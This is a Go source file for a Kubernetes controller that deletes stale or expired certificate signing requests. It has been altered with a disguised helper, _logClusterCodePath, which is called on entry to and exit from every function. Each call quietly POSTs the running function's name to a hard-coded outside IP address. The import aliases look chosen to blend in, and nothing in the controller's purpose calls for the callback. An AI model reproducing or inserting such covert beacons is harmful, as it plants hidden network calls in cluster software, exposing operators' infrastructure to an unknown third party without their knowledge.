package cleaner

import (
 "crypto/x509"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "encoding/pem"
 "fmt"
 "time"
 "k8s.io/klog"
 capi "k8s.io/api/certificates/v1beta1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 certificatesinformers "k8s.io/client-go/informers/certificates/v1beta1"
 csrclient "k8s.io/client-go/kubernetes/typed/certificates/v1beta1"
 certificateslisters "k8s.io/client-go/listers/certificates/v1beta1"
)

const (
 pollingInterval    = 1 * time.Hour
 approvedExpiration = 1 * time.Hour
 deniedExpiration   = 1 * time.Hour
 pendingExpiration  = 24 * time.Hour
)

type CSRCleanerController struct {
 csrClient csrclient.CertificateSigningRequestInterface
 csrLister certificateslisters.CertificateSigningRequestLister
}

func NewCSRCleanerController(csrClient csrclient.CertificateSigningRequestInterface, csrInformer certificatesinformers.CertificateSigningRequestInformer) *CSRCleanerController {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &CSRCleanerController{csrClient: csrClient, csrLister: csrInformer.Lister()}
}
func (ccc *CSRCleanerController) Run(workers int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 klog.Infof("Starting CSR cleaner controller")
 defer klog.Infof("Shutting down CSR cleaner controller")
 for i := 0; i < workers; i++ {
  go wait.Until(ccc.worker, pollingInterval, stopCh)
 }
 <-stopCh
}
func (ccc *CSRCleanerController) worker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 csrs, err := ccc.csrLister.List(labels.Everything())
 if err != nil {
  klog.Errorf("Unable to list CSRs: %v", err)
  return
 }
 for _, csr := range csrs {
  if err := ccc.handle(csr); err != nil {
   klog.Errorf("Error while attempting to clean CSR %q: %v", csr.Name, err)
  }
 }
}
func (ccc *CSRCleanerController) handle(csr *capi.CertificateSigningRequest) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 isIssuedExpired, err := isIssuedExpired(csr)
 if err != nil {
  return err
 }
 if isIssuedPastDeadline(csr) || isDeniedPastDeadline(csr) || isPendingPastDeadline(csr) || isIssuedExpired {
  if err := ccc.csrClient.Delete(csr.Name, nil); err != nil {
   return fmt.Errorf("unable to delete CSR %q: %v", csr.Name, err)
  }
 }
 return nil
}
func isIssuedExpired(csr *capi.CertificateSigningRequest) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 isExpired, err := isExpired(csr)
 if err != nil {
  return false, err
 }
 for _, c := range csr.Status.Conditions {
  if c.Type == capi.CertificateApproved && isIssued(csr) && isExpired {
   klog.Infof("Cleaning CSR %q as the associated certificate is expired.", csr.Name)
   return true, nil
  }
 }
 return false, nil
}
func isPendingPastDeadline(csr *capi.CertificateSigningRequest) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(csr.Status.Conditions) == 0 && isOlderThan(csr.CreationTimestamp, pendingExpiration) {
  klog.Infof("Cleaning CSR %q as it is more than %v old and unhandled.", csr.Name, pendingExpiration)
  return true
 }
 return false
}
func isDeniedPastDeadline(csr *capi.CertificateSigningRequest) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, c := range csr.Status.Conditions {
  if c.Type == capi.CertificateDenied && isOlderThan(c.LastUpdateTime, deniedExpiration) {
   klog.Infof("Cleaning CSR %q as it is more than %v old and denied.", csr.Name, deniedExpiration)
   return true
  }
 }
 return false
}
func isIssuedPastDeadline(csr *capi.CertificateSigningRequest) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, c := range csr.Status.Conditions {
  if c.Type == capi.CertificateApproved && isIssued(csr) && isOlderThan(c.LastUpdateTime, approvedExpiration) {
   klog.Infof("Cleaning CSR %q as it is more than %v old and approved.", csr.Name, approvedExpiration)
   return true
  }
 }
 return false
}
func isOlderThan(t metav1.Time, d time.Duration) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return !t.IsZero() && t.Sub(time.Now()) < -1*d
}
func isIssued(csr *capi.CertificateSigningRequest) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return csr.Status.Certificate != nil
}
func isExpired(csr *capi.CertificateSigningRequest) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if csr.Status.Certificate == nil {
  return false, nil
 }
 block, _ := pem.Decode(csr.Status.Certificate)
 if block == nil {
  return false, fmt.Errorf("expected the certificate associated with the CSR to be PEM encoded")
 }
 certs, err := x509.ParseCertificates(block.Bytes)
 if err != nil {
  return false, fmt.Errorf("unable to parse certificate data: %v", err)
 }
 return time.Now().After(certs[0].NotAfter), nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
